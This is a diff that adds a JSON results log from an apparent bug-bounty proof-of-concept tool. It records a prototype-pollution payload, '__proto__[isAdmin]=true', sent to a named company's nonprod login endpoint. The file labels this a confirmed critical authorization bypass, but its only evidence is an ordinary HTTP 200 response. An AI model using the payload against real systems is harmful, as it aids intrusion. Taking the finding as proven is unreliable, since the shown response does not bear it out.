@@ -1,0 +1,55 @@
+{
+  "timestamp": "2025-06-08T23:25:34.910778",
+  "total_tested": 1,
+  "successful": 1,
+  "results": [
+    {
+      "vulnerability": {
+        "id": 1,
+        "type": "Authorization Bypass",
+        "severity": "CRITICAL",
+        "endpoint": "https://uat-bugbounty.nonprod.syfe.com/login",
+        "method": "POST",
+        "description": "Authorization bypass vulnerability confirmed through pollution testing",
+        "payload": "__proto__[isAdmin]=true",
+        "impact": "Complete system compromise possible",
+        "cvss_score": 10.0
+      },
+      "timestamp": "2025-06-08T23:25:25.593851",
+      "success": true,
+      "response_data": {
+        "status_code": 200,
+        "headers": {
+          "Date": "Sun, 08 Jun 2025 21:25:26 GMT",
+          "Content-Type": "text/html; charset=utf-8",
+          "Transfer-Encoding": "chunked",
+          "Connection": "keep-alive",
+          "CF-Ray": "94cb76348a99e296-BEG",
+          "CF-Cache-Status": "DYNAMIC",
+          "Cache-Control": "private, no-cache, no-store, max-age=0, must-revalidate",
+          "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
+          "Vary": "Accept-Encoding",
+          "Content-Security-Policy": "default-src 'self' *.syfe.com; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://npmcdn.com https://challenges.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://unpkg.com https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://*.cloudfront.net https://www.gstatic.com https://www.buzzsprout.com https://www.google.com https://websdk.appsflyer.com https://www.syfe.com https://www.google-analytics.com https://calendly.com https://ssl.google-analytics.com https://www.googleadservices.com https://www.googletagmanager.com https://app.intercom.io https://widget.intercom.io https://js.intercomcdn.com https://www.youtube.com https://s.ytimg.com http://static.hotjar.com https://static.hotjar.com https://script.hotjar.com https://static.zdassets.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com wss://syfe.zendesk.com wss://*.zopim.com https://stats.g.doubleclick.net https://connect.facebook.net https://fast.wistia.com https://optimize.google.com https://sjs.bizographics.com https://px.ads.linkedin.com https://tagmanager.google.com https://snap.licdn.com https://amplify.outbrain.com https://cdn.taboola.com https://trc.taboola.com https://googleads.g.doubleclick.net https://www.datadoghq-browser-agent.com https://www.bugherd.com https://d2iiunr5ws5ch1.cloudfront.net https://d2wy8f7a9ursnm.cloudfront.net https://rum-http-intake.logs.datadoghq.eu https://api.smooch.io https://accounts.google.com https://appleid.cdn-apple.com https://*.srv.stackadapt.com https://qvdt3feo.com; img-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://*.cloudfront.net https://stable-nonprod-mb-v2-user-documents-bucket.s3.ap-south-1.amazonaws.com https://*.googleusercontent.com https://uat-11.nonprod.syfe.com https://uat-14.nonprod.syfe.com https://uat-1.nonprod.syfe.com https://www.syfe.com https://staging-syfeblog.temp513.kinsta.cloud https://staging-blogsyfeau.kinsta.cloud https://badge.seedly.sg https://googleads.g.doubleclick.net https://d2iiunr5ws5ch1.cloudfront.net https://www.google.com https://www.googletagmanager.com https://optimize.google.com https://www.google-analytics.com https://js.intercomcdn.com https://static.intercomassets.com https://downloads.intercomcdn.com https://uploads.intercomusercontent.com https://gifs.intercomcdn.com https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://insights.hotjar.com http://static.hotjar.com https://static.hotjar.com https://assets.calendly.com https://ekr.zdassets.com https://syfe.zendesk.com https://v2assets.zopim.io https://static.zdassets.com https://www.facebook.com https://stats.g.doubleclick.net https://embedwistia-a.akamaihd.net https://fast.wistia.com https://www.google.com https://www.google.com.sg https://www.google.co.in https://ssl.gstatic.com https://www.gstatic.com https://px.ads.linkedin.com https://tr.outbrain.com https://amplifypixel.outbrain.com https://p.adsymptotic.com https://www.dianomi.com https://cds.taboola.com https://api.smooch.io https://accounts.zendesk.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://accounts.google.com https://optimize.google.com https://fonts.googleapis.com https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://d2iiunr5ws5ch1.cloudfront.net https://tagmanager.google.com https://calendly.com https://*.srv.stackadapt.com; font-src 'self' data: https://cdnjs.cloudflare.com https://assets.nonprod.syfe.com https://*.website-files.com https://fonts.googleapis.com https://fonts.gstatic.com  https://stable-nonprod-mb-v2-www-assets-sync-bucket.s3.amazonaws.com https://js.intercomcdn.com http://static.hotjar.com https://static.hotjar.com; child-src 'self' blob: https://share.intercom.io https://assets.nonprod.syfe.com https://intercom-sheets.com https://www.youtube.com https://vars.hotjar.com https://fast.wistia.net; media-src 'self' data: blob: https://www.syfe.com https://assets.nonprod.syfe.com https://js.intercomcdn.com https://static.zdassets.com https://embedwistia-a.akamaihd.net https://stable-production-v1-public-assets.s3.ap-southeast-1.amazonaws.com/ https://uat-1.nonprod.syfe.com; object-src 'self' blob:; connect-src 'self' data: *; frame-src 'self' https://meetings.hubspot.com https://accounts.google.com https://challenges.cloudflare.com https://www.google.com/ https://open.spotify.com https://www.buzzsprout.com https://optimize.google.com https://fast.wistia.com/ https://www.youtube.com/ https://vars.hotjar.com https://www.facebook.com/ https://calendly.com;",
+          "Feature-Policy": "geolocation 'none'; midi 'none'; sync-xhr 'none'; microphone 'none'; camera 'self'; magnetometer 'none'; gyroscope 'none'; fullscreen 'none'; payment 'none';",
+          "X-Content-Type-Options": "nosniff",
+          "X-Frame-Options": "sameorigin",
+          "X-Powered-By": "Next.js",
+          "X-XSS-Protection": "1; mode=block",
+          "Server": "cloudflare",
+          "Content-Encoding": "gzip"
+        },
+        "content_length": 239750,
+        "response_time": 0.791822
+      },
+      "screenshot_path": "PoC/screenshots/shadowfox_poc_1_20250608_232526.png",
+      "evidence": [
+        "Payload execution successful - server response indicates compromise"
+      ]
+    }
+  ],
+  "metadata": {
+    "tool": "ShadowFox PoC Manager Elite",
+    "version": "2.0",
+    "researcher": "H1:Whitefox980"
+  }
+}
